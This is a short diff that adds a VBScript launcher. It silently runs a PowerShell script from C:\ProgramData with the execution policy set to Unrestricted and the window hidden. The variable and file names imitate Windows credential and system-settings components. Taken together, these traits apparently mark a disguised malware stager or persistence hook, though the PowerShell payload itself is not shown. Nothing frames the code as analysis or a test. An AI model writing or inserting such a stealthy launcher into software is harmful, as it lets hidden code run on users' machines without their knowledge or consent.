@@ -1,0 +1,3 @@
+CredentialEnrollmentManagerForUser = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File C:\ProgramData\CheckNetIsolation\SystemSettings.UserAccountsHandlers.ps1"
+set shell = CreateObject("WScript.Shell")
+shell.Run CredentialEnrollmentManagerForUser,0
